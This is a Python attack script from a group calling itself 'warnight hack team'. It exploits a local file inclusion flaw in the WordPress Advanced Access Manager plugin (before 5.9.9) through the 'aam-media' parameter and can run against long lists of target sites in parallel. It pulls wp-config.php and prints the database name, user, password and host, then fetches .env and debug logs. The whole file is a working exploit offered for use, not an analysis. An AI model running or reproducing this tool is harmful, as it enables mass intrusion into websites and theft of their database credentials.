import argparse
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import logging

logging.getLogger("requests").setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

LOGO = r"""
██╗    ██╗███╗    ██╗██╗  ██╗████████╗
██║    ██║████╗   ██║██║  ██║╚══██╔══╝
██║ █╗ ██║██╔██╗  ██║███████║   ██║   
██║███╗██║██║╚██╗ ██║██╔══██║   ██║   
╚███╔███╔╝██║ ╚█████║██║  ██║   ██║   
 ╚══╝╚══╝  ╚═╝  ╚═══╝╚═╝  ╚══╝  ╚═╝   
"""
WNHT_TEXT = "warnight hack team - WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion Scanner"

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

SENSITIVE_WP_FILES_LIMITED = [
    "wp-config.php",
    "wp-content/debug.log",
    "wp-includes/version.php",
    "README.txt",
    ".env",
]

def print_banner():
    print(MAGENTA + LOGO + RESET)
    print(YELLOW + f"        {WNHT_TEXT}" + RESET)
    print(CYAN + f"          Author > onemoriarty{RESET}")
    print(CYAN + f"          Discord: https://discord.gg/QRppCpjvZc{RESET}")
    print(CYAN + f"          Forum: warnight.rf.gd{RESET}")
    print("-" * 50)

def generate_direct_payloads(filename):
    return [filename]

def fetch_file_content(url, filename_base, selected_files_to_fetch):
    if 'all' not in selected_files_to_fetch and filename_base not in selected_files_to_fetch:
        return None

    php_error_pattern = re.compile(r"PHP (Warning|Deprecated|Fatal error|Parse error|Notice):", re.IGNORECASE)

    payloads_to_try = generate_direct_payloads(filename_base)

    for payload_path in payloads_to_try:
        full_payload_url = f"{url}/?aam-media={payload_path}"
        
        try:
            response = requests.get(full_payload_url, timeout=5)
            if response.status_code == 200:
                response_text_stripped = response.text.strip()
                if not response_text_stripped or php_error_pattern.search(response_text_stripped):
                    continue
                else:
                    print(f"    {GREEN}[+] {filename_base} fetched --> {url}{RESET}")
                    print(f"    {CYAN}--- START: {payload_path} ({url}) ---\n{response_text_stripped}\n--- END: {payload_path} ({url}) ---{RESET}\n")
                    return response.text
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.RequestException as e:
            continue
    
    print(f"    {YELLOW}[*] Did not return valid content or timed out for '{filename_base}' --> {url}{RESET}")
    return None

def check_lfi(url, selected_files_to_fetch):
    print(f"{BLUE}<{url}> scanning{RESET}")
    
    wp_config_pulled = False

    wp_config_filename = "wp-config.php"
    payload_url = f"{url}/?aam-media={wp_config_filename}"
    try:
        response = requests.get(payload_url, timeout=5)
        if response.status_code == 200:
            response_text_stripped = response.text.strip()
            if "DB_NAME" in response_text_stripped and "DB_PASSWORD" in response_text_stripped:
                print(f"{GREEN}[+] Vulnerability Found: {url} - wp-config.php successfully pulled.{RESET}")
                wp_config_pulled = True
                
                db_name = re.search(r"define\(\s*'DB_NAME',\s*'(.*?)'\s*\);", response_text_stripped)
                db_user = re.search(r"define\(\s*'DB_USER',\s*'(.*?)'\s*\);", response_text_stripped)
                db_password = re.search(r"define\(\s*'DB_PASSWORD',\s*'(.*?)'\s*\);", response_text_stripped)
                db_host = re.search(r"define\(\s*'DB_HOST',\s*'(.*?)'\s*\);", response_text_stripped)

                if db_name:
                    print(f"    {CYAN}DB_NAME: {db_name.group(1)}{RESET}")
                if db_user:
                    print(f"    {CYAN}DB_USER: {db_user.group(1)}{RESET}")
                if db_password:
                    print(f"    {CYAN}DB_PASSWORD: {db_password.group(1)}{RESET}")
                if db_host:
                    print(f"    {CYAN}DB_HOST: {db_host.group(1)}{RESET}")
            else:
                print(f"{RED}[-] Vulnerability Not Found or Failed: {url} (HTTP Code: 200 but no expected wp-config.php content or contains PHP errors){RESET}")
        else:
            print(f"{RED}[-] Vulnerability Not Found or Failed: {url} (HTTP Code: {response.status_code}){RESET}")
        
        if not wp_config_pulled:
            return False

    except requests.exceptions.Timeout:
        print(f"{RED}[*] Request timed out for ({url}), skipping.{RESET}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"{RED}[*] An error occurred: {url} - {e}{RESET}")
        return False
    except Exception as e:
        print(f"{RED}[*] An unexpected error occurred: {url} - {e}{RESET}")
        return False

    if wp_config_pulled:
        print(f"\n{YELLOW}[*] Checking selected potential sensitive WordPress files...{RESET}")
        for sensitive_file_base in SENSITIVE_WP_FILES_LIMITED:
            if sensitive_file_base == "wp-config.php":
                continue
            
            fetch_file_content(url, sensitive_file_base, selected_files_to_fetch)
        return True
    return False

def main():
    parser = argparse.ArgumentParser(description=f"WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion Scanner")
    parser.add_argument("-u", "--url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-l", "--list", help="File containing target URLs (one URL per line)")
    parser.add_argument("-w", "--workers", type=int, default=50,
                        help="Number of concurrent workers (default: 50)")

    args = parser.parse_args()

    print_banner()

    urls_to_scan = []
    if args.url:
        urls_to_scan.append(args.url.rstrip('/'))
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                urls_to_scan = [line.strip().rstrip('/') for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{RED}[!] Error: File '{args.list}' not found.{RESET}")
            return
    else:
        parser.print_help()
        return

    if not urls_to_scan:
        print(f"{RED}[!] No URLs to scan found. Please use -u or -l parameter.{RESET}")
        return

    selected_files_to_fetch = []
    if sys.stdin.isatty():
        print(f"{YELLOW}--- File Fetching Options ---{RESET}")
        print(f"{YELLOW}If you want to fetch all sensitive documents, type '{GREEN}all{YELLOW}'.{RESET}")
        print(f"{YELLOW}Otherwise, enter the numbers of the files you want to fetch, separated by commas (e.g.: '{CYAN}1,3{YELLOW}').{RESET}")
        print(f"{YELLOW}If you don't want to fetch anything, leave it blank and press Enter.{RESET}")
        
        for i, file in enumerate(SENSITIVE_WP_FILES_LIMITED):
            print(f"  {i+1}. {file}")
        
        choice_str = input(f"{CYAN}Your choice (all, 1,2,3... or blank): {RESET}").lower()

        if choice_str == 'all':
            selected_files_to_fetch.append('all')
        elif choice_str:
            try:
                choices = [int(c.strip()) for c in choice_str.split(',')]
                for choice in choices:
                    if 1 <= choice <= len(SENSITIVE_WP_FILES_LIMITED):
                        selected_files_to_fetch.append(SENSITIVE_WP_FILES_LIMITED[choice-1])
                    else:
                        print(f"{RED}Warning: Invalid file number '{choice}' skipped.{RESET}")
            except ValueError:
                print(f"{RED}Invalid input. Please enter 'all', a list of numbers, or leave blank.{RESET}")
                return

    print(f"{BLUE}[*] Starting scan... Targets: {len(urls_to_scan)}, Workers: {args.workers}{RESET}")
    print("-" * 50)

    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {executor.submit(check_lfi, url, selected_files_to_fetch): url for url in urls_to_scan}
        for future in as_completed(futures):
            url = futures[future]
            try:
                future.result()
            except Exception as exc:
                print(f"{RED}[*] An exception occurred while processing URL '{url}': {exc}{RESET}")

    print("-" * 50)
    print(f"{BLUE}[*] Scan completed.{RESET}")

if __name__ == "__main__":
    main()
